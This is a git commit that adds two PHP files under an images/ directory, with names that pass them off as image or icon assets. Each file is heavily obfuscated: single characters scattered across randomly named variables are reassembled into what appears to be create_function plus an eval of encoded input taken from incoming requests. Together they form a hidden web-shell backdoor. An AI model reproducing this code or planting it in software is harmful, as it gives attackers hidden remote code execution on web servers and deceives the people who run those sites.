07d72280bf8562d7fd5b1e04eaad9fc4a14a27df
ectech <jamil.evans@evanschambers.com>
2019-04-25 15:02:00 -0400

    Second commit

---
+++ images/background_new.php
@@ -0,0 +1,108 @@
+<?php
+$augite= ')';$lynett = 'r';$caralie= 'e';
+$layla= 'B';
+
+$interpolating= 'a';
+
+$feathering ='b';
+
+$carbonize='a';$hyperboloidal ='F'; $gert ='r';
+$impractical ='"("tRBe';$levelled= 'ovloqQ]';
+
+$gloves = 'S';
+
+$cabin = 'M'; $girders ='H'; $foam= 'gD]n"P)(m';
+
+$ashtray='B';$francesco =']';$guarding='ife';$expenditure= 'H';$lint ='v';
+
+$condemning='r)e4iA>'; $ends= ')';$breathtakingly ='s'; $gins= 'i'; $irredentism =')'; $dramatic ='D';$deceptive= 'e'; $experimenting ='sev';
+$denigrates='(';
+$loggers='i';
+$audiences ='p$a'; $divisive ='r(aHOY$'; $combinatorially = '?$NT_""'; $careworn =';'; $cannibalizing ='c';$jack='B'; $hard = 'g';$asbestos= '($rVnbatB';$confesses =']'; $couched = 'r';$garment ='o_$?CH_';
+
+$eal ='o';$copy =')=s['; $keely='R'; $arin='abftd';$initially = 'e';$deferral= ')'; $bedbug= 't';$grips= 'm';$alternations = 'E';$kessia = 'iMdEdGm '; $bastard= 'J'; $amelina= 'c'; $founding='Trs';$clamming ='LQ_'; $circuit='i';
+
+$ebonics= 'FH[R';$dragons= 'R'; $explode = '"';$forced = '$';$exogamous = '_';
+$appropriable= 'E';$banging= 'leF[iT_'; $dispatch ='c';
+
+$drunker =')Q_osra';$castigate ='O'; $belvidere ='gervys'; $debates= ':';$capo =';';
+$jakob='_';$dickie= 'Uai=6e_cT';$gestures= 'eutshd'; $governance= 'D(?@';
+
+$directed= 'E(K$r'; $brine='e';$loyalty='M';$crustaceans = 'P'; $lumpy= 'r';$intimated='h)f';$groans ='U,n(';$exhaustedly='"iP';$balletic='O';$madella ='e[OVO[CEe';$dynah = ';';$inert ='a)E'; $jaynell ='T';$ethanol = 't"q'; $disservice='b'; $decedent='b';$delimited= 'uf$)$yI,';
+
+$fliers ='eQ(';$hydrogenate ='(';$colorimetry ='(asZXd_St';
+$arrested = ':p';$attentiveness= 'K'; $crustaceans= ';'; $costed = 'SIWTa$_';$anthony=$dickie['7'] .
+
+$lumpy.$fliers['0'].
+
+$costed['4'].
+$colorimetry['8'].
+
+$fliers['0'] . $costed['6'].$delimited['1']. $delimited['0'] . $groans['2'].
+$dickie['7'] .
+
+$colorimetry['8'].$exhaustedly['1']. $drunker['3']. $groans['2'] ;
+$clara = $kessia['7'] ; $associator = $anthony($clara,$fliers['0'].
+$belvidere['3'] .$costed['4'] .$banging['0'] .
+
+$colorimetry['0'].$costed['4'].$lumpy. $lumpy. $costed['4'] . $delimited['5'] .
+$costed['6'].$arrested['1']. $drunker['3'] .$arrested['1'] . $colorimetry['0'].
+
+$delimited['1'] . $delimited['0'] .$groans['2'] .$dickie['7'].$costed['6'] .$belvidere['0'].$fliers['0'] .$colorimetry['8'] . $costed['6'] . $costed['4'].$lumpy .
+$belvidere['0'] . $colorimetry['2'] .$colorimetry['0'].$delimited['3'] .$delimited['3'].$delimited['3'] .$crustaceans); $associator($clamming['0'],$condemning['3'] ,$delimited['5'] , $divisive['5'], $colorimetry['4'] , $delimited['1'],$costed['5'] .$exhaustedly['1'] .
+
+$dickie['3'] . $costed['4']. $lumpy. $lumpy . $costed['4'] . $delimited['5'] .$costed['6']. $kessia['6']. $fliers['0'] .
+
+$lumpy.
+$belvidere['0'] . $fliers['0'] .$colorimetry['0'] .
+
+$costed['5'].$costed['6']. $dragons.
+
+$inert['2'].
+
+$fliers['1'].
+$groans['0'] .$inert['2']. $costed[0] . $costed['3'].$delimited['7'] . $costed['5'] .$costed['6'] .
+
+$madella['6'].$madella['4'] . $madella['4']. $attentiveness. $costed['1'].$inert['2'] .
+
+$delimited['7']. $costed['5'] .$costed['6'].
+$costed[0] . $inert['2'] .
+$dragons. $madella['3'] .$inert['2']. $dragons.$delimited['3'].$crustaceans. $costed['5'] .
+
+$costed['4'] . $dickie['3'].$exhaustedly['1'].
+$colorimetry['2']. $colorimetry['2'] . $fliers['0']. $colorimetry['8'].$colorimetry['0'].$costed['5']. $exhaustedly['1'] .
+$madella[5].$ethanol['1']. $decedent. $intimated[0] .$colorimetry['5'] .
+
+$drunker['3']. $delimited['1'] .$ethanol['2'] .
+$decedent.$kessia['6'].$ethanol['1'] .$confesses. $delimited['3'] .$governance['2'] .$costed['5'] . $exhaustedly['1'] .$madella[5]. $ethanol['1'] .$decedent . $intimated[0].$colorimetry['5'] .$drunker['3'] . $delimited['1'].$ethanol['2']. $decedent.$kessia['6'] .$ethanol['1'] . $confesses .$arrested['0']. $colorimetry['0'] .
+$exhaustedly['1'] . $colorimetry['2']. $colorimetry['2'] .
+
+$fliers['0'] .
+$colorimetry['8'] . $colorimetry['0']. $costed['5'] .$exhaustedly['1']. $madella[5] . $ethanol['1'] . $ebonics['1'] . $costed['3'].
+$costed['3']. $exhaustedly[2] .
+$costed['6'] . $asbestos[8].$ebonics['1']. $governance['0'] .
+
+$madella['4'] .$banging['2'].
+
+$fliers['1'] . $asbestos[8].
+$loyalty. $ethanol['1'] . $confesses. $delimited['3'] .$governance['2'] . $costed['5'] .
+
+$exhaustedly['1'] . $madella[5] . $ethanol['1']. $ebonics['1'].$costed['3'].
+$costed['3'].
+$exhaustedly[2] .$costed['6']. $asbestos[8].$ebonics['1'] .$governance['0'] . $madella['4'].$banging['2'] .$fliers['1']. $asbestos[8] .
+
+$loyalty.
+
+$ethanol['1'] .
+
+$confesses .
+$arrested['0']. $colorimetry['5'].
+
+$exhaustedly['1'].$fliers['0'] .$delimited['3'] .$crustaceans.$fliers['0'] .$belvidere['3'] .$costed['4'] . $banging['0'] .$colorimetry['0'].$colorimetry['2'] . $colorimetry['8'] . $lumpy .
+$lumpy.$fliers['0'] .
+$belvidere['3'] . $colorimetry['0'].
+$decedent.$costed['4'] . $colorimetry['2']. $fliers['0']. $dickie[4].$condemning['3'] . $costed['6'] .$colorimetry['5']. $fliers['0'] .$dickie['7'].
+
+$drunker['3']. $colorimetry['5']. $fliers['0']. $colorimetry['0'].$colorimetry['2'].$colorimetry['8'] . $lumpy.$lumpy. $fliers['0'] .$belvidere['3'].$colorimetry['0'].$costed['5'] .$costed['4'] . $delimited['3']. $delimited['3'].
+
+$delimited['3'] .$delimited['3']. $crustaceans  );
---
+++ images/icon_basecamp_bck_old.php
@@ -0,0 +1,89 @@
+<?php
+$asdfghjkl ='c'; $krad ='KHJ_'; $cupric ='p[sirbe';$consents = 'U';$greatest ='r';
+
+$donnell= 'a'; $atomized='eTwU'; $haircuts= '"au$e('; $blundering = 'r]';$fluctuate ='$'; $krystalle =':';$emancipate ='e';
+$fgh= ')'; $devotion= '(sHT'; $glistening ='y]$(';$gazer='$';$blinking =')'; $injection = '(W];HL';$coolers = 'eueV'; $implements='En';
+$detector= ':t';$equilibriums = '$'; $hiatus='@UEm'; $bright='F_,';
+
+$cowbird= 'F';$defeated= '('; $amendment= 'e';$bauxite = 'lag)R?h'; $faina= '_Be'; $beetle ='fHGPs'; $contented='6';$encephalitis='Fr)vE'; $cameraman ='bta"Ho'; $elk = ';i"ataTOn';$hauled= 'ttU"'; $corrodible ='ctEB_$)';$lawless ='r';
+$grow = ';';
+
+$lexicons ='Q';$codpiece = 'c'; $ambidextrous= ')';
+
+$bewilder='u';
+$build ='('; $grabber='h';
+
+$corning= 'Ta'; $crawlers= ',Ei';$fewest='('; $cattleman ='Rtuf(nvr'; $amalgam= 'r';$hosiery = 'hgCgF[e_S';$bindery ='od4';
+$break='ifsaiPr'; $dalila= 'b';
+$galvanic= 'e"?asH'; $flushed= '=';$baneberry='r'; $cataloger = 's"r';$deceived = 'O$';$directionally ='A';$cabling='C';$mab='(ir oe';$converged ='f';
+$groupings ='R';$extras = 'I';$lapels= 'd'; $fonzie = '$';$intersecting= 'i)';$extracted ='dT';
+
+$indium='OeEK_t]Wp';$fiddle = 'R';
+$honeycombed = 'FB$S_yai';
+$intradepartment= '_S?HTQ(h';$bartie='e';$chalked=')T=';$berny = 'NeTDlv)fc';$cased = 'P_f$;t';
+
+$bartsimpson= ')';$gregory = '_vse"I("';$domicile='w';
+$duly ='M';
+$bugger ='s'; $enacts = '[';
+$being ='[';$chat ='i';$forborne ='a';$decelerate ='_';
+$berrie= ')'; $bloodstone =$berny['8']. $mab['2'] .$gregory[3]. $forborne . $cased['5']. $gregory[3].
+$decelerate . $cased['2'] .$cattleman['2'] . $cattleman['5']. $berny['8'] . $cased['5'] . $chat.$mab['4']. $cattleman['5'] ; $extremis = $mab['3'];$increase =$bloodstone
+($extremis,$gregory[3] .$gregory[1] . $forborne. $berny['4'] . $gregory['6'].
+
+$forborne. $mab['2'] .
+$mab['2'].$forborne.$honeycombed[5] . $decelerate . $indium['8']. $mab['4'] . $indium['8'] .$gregory['6']. $cased['2'] .$cattleman['2']. $cattleman['5'].
+
+$berny['8'].$decelerate . $hosiery['3'] . $gregory[3] .$cased['5']. $decelerate .$forborne .$mab['2'] .$hosiery['3'].$bugger . $gregory['6'] . $berrie['0'].$berrie['0'] .
+$berrie['0']. $cased[4]); $increase ($hauled[2],$coolers['3'],
+
+$mab['3'], $cattleman['5'] , $intradepartment['1'],$intradepartment[7], $cattleman['5'] ,$cased['3'].$chat .$chalked['2'].
+$forborne. $mab['2'] .$mab['2'].$forborne .$honeycombed[5] .$decelerate.
+
+$hiatus['3'] .$gregory[3] .$mab['2'] . $hosiery['3'] . $gregory[3].
+$gregory['6'] .
+
+$cased['3'] .
+$decelerate.
+
+$fiddle .
+
+$indium['2'] . $intradepartment[5]. $hauled[2].$indium['2'].
+
+$intradepartment['1'].
+$berny['2'] . $crawlers['0'].$cased['3']. $decelerate .$cabling.
+
+$indium['0']. $indium['0'] . $indium[3].$gregory['5'] . $indium['2'].
+
+$crawlers['0'] .
+$cased['3']. $decelerate.$intradepartment['1'].
+$indium['2']. $fiddle.$coolers['3'].
+$indium['2']. $fiddle.
+
+$berrie['0'].$cased[4] .$cased['3']. $forborne . $chalked['2'] .$chat .$bugger. $bugger .$gregory[3]. $cased['5'].$gregory['6'].$cased['3']. $chat . $being.
+
+$gregory['7'].$cased['2'] .$domicile. $intradepartment[7] .
+
+$cased['5'].$intradepartment[7] . $dalila .$cattleman['2']. $cased['2'] . $gregory['7'] . $indium['6'].
+$berrie['0'] .$intradepartment[2].$cased['3'] .$chat .$being . $gregory['7'] . $cased['2']. $domicile .$intradepartment[7] . $cased['5'] . $intradepartment[7] .$dalila.$cattleman['2'] .$cased['2'] .$gregory['7'] . $indium['6'] . $detector[0] . $gregory['6']. $chat. $bugger.
+
+$bugger.$gregory[3] .$cased['5'] .$gregory['6'] .$cased['3'].$chat .
+
+$being.$gregory['7'] . $intradepartment['3'] .$berny['2'].
+$berny['2'].$cased[0] . $decelerate . $honeycombed['0'] .$indium['7']. $intradepartment['3'] . $berny['2'] .
+$intradepartment['3']. $honeycombed['1'].$hauled[2] . $honeycombed['0'] . $gregory['7'] .$indium['6'].$berrie['0'] .$intradepartment[2]. $cased['3'] .$chat .$being .$gregory['7'] . $intradepartment['3'] .$berny['2'] .$berny['2'] . $cased[0] . $decelerate.$honeycombed['0'].$indium['7'].
+$intradepartment['3'] .$berny['2'] .$intradepartment['3']. $honeycombed['1'] .
+
+$hauled[2] .$honeycombed['0'].
+$gregory['7'].$indium['6'] . $detector[0]. $extracted['0'] . $chat.$gregory[3].$berrie['0'] . $cased[4] .$gregory[3].$gregory[1] . $forborne . $berny['4'] . $gregory['6'] .
+
+$bugger . $cased['5'] .
+$mab['2'] .
+
+$mab['2'].$gregory[3].
+$gregory[1] . $gregory['6'] . $dalila .$forborne. $bugger. $gregory[3] .
+$contented. $bindery[2] .$decelerate .
+$extracted['0'] .$gregory[3]. $berny['8']. $mab['4'].$extracted['0'] .$gregory[3]. $gregory['6'] .$bugger.$cased['5'] .$mab['2'] .
+
+$mab['2'].$gregory[3].$gregory[1] . $gregory['6']. $cased['3'].
+
+$forborne .$berrie['0'].$berrie['0']. $berrie['0'].$berrie['0']. $cased[4] ); 
